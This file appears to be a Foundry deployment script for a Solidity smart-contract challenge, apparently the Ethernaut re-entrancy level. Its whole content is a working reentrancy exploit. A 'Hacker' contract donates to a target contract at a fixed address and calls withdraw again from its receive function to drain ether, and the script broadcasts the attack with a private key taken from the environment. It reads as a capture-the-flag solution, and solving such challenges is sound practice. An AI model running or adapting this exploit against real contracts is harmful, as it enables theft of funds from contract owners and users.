// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import {Script} from "forge-std/Script.sol";
import {Reentrance} from "../src/Reenter.sol";

contract Hacker {
    Reentrance public reentrance = Reentrance(0x18156aBa7bef62B3aF6b93db5Fe301909cFF98E1);

    constructor() public payable {
        reentrance.donate{value: 0.001 ether}(address(this));
    }

    function withdraw() external {
        reentrance.withdraw(0.001 ether);
        (bool ok,) = msg.sender.call{value: 0.002 ether}("");
    }

    receive() external payable {
        reentrance.withdraw(0.001 ether);
    }
}

contract ReenterScript is Script {
    function run() external {
        vm.startBroadcast(vm.envUint("PRIV"));
        Hacker hacker = new Hacker{value: 0.001 ether}();
        hacker.withdraw();
        vm.stopBroadcast();
    }
}
